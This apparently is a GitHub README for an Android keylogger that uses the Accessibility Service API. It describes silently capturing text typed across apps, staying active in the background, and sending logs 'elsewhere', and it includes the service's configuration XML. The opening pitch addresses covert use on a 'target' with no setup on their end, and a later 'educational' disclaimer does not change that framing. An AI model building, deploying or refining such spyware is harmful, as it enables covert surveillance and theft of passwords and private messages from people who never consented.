# Key-Logger-android
this is an android key logger that captures keystrokes and remains active in the background without needing to be interacted with after opened this will require one permission  no technical setup on the targets end

# Android Keylogger via Accessibility Service

This project is a keylogger implementation for Android that uses the Accessibility Service API to monitor and log text input events across applications. It is intended for **educational**, **development**, or **authorized internal testing** purposes only.

## Overview

The keylogger works by running a custom `AccessibilityService` that listens for `TYPE_VIEW_TEXT_CHANGED` and `TYPE_VIEW_FOCUSED` events. These are triggered when a user types in a text field or when a view gains focus. The service can retrieve and log the content of these events, making it possible to capture user input at the system level.

Unlike older methods that relied on input APIs or root access, this approach works without rooting the device and is compatible with modern Android versions, including Android 14 (API 35), when configured correctly.

---

## How It Works

- The app defines a foreground service (`KeyLoggerService`) that extends `AccessibilityService`.
- Upon activation, the service monitors system-wide accessibility events related to text changes.
- Relevant data from these events is extracted, filtered, and optionally logged (to Logcat, local storage, or sent elsewhere).
- This approach does not capture physical keyboard presses directly, but intercepts text after it is rendered into views.

---

## Key Components

### 1. Accessibility Service Configuration

Located at: `res/xml/accessibility_service_config.xml`

```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:settingsActivity="com.example.myapplication.MainActivity" />
